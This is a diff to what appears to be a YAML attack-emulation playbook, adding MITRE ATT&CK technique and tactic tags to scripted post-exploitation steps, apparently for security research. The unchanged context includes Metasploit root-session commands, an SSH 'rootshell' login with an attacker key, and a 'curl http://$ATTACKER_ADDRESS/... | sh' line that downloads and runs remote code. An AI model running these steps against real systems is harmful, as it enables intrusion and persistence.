@@ -132,6 +132,9 @@ commands:
     read: True
     cmd: id
     session: "foothold"
+    metadata:
+      techniques: "T1033"
+      tactics: "Discovery"
 
   - type: msf-session
     cmd: "cd /var/www/default"
@@ -229,10 +232,16 @@ commands:
   - type: msf-session
     cmd: id
     session: "root"
+    metadata:
+      techniques: "T1033"
+      tactics: "Discovery"
 
   - type: msf-session
     session: "root"
     cmd: "curl http://$ATTACKER_ADDRESS/README.txt.3 | sh"
+    metadata:
+      techniques: "T1105,T1136"
+      tactics: "Command and Control,Persistence"
 
   - type: sleep
     seconds: 40
@@ -241,6 +250,9 @@ commands:
     cmd: id
     read: True
     session: "root"
+    metadata:
+      techniques: "T1033"
+      tactics: "Discovery"
 
 
 # TODO: THIS COMMAND DOES NOT WORK
@@ -276,6 +288,9 @@ commands:
     key_filename: "/home/aecid/.ssh/attacker_key"
     creates_session: "rootshell"
     clear_cache: True
+    metadata:
+      techniques: "T1033"
+      tactics: "Discovery"
 
   - type: ssh
     cmd: pwd
